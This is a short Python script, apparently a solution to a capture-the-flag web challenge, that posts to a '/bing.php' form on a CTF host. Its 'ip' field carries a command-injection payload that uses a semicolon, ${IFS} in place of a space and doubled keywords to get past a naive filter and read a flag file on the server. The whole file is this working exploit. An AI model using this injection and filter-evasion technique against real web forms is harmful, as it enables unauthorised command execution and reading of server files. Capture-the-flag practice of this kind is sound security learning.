import requests

url = 'https://9e7c222458a04a7313d30df3.deadsec.quest'

res = requests.post(url+'/bing.php', data={'Submit': True, 'ip': ';cacatt${IFS}/flaflagg.txt'})
print(res.text)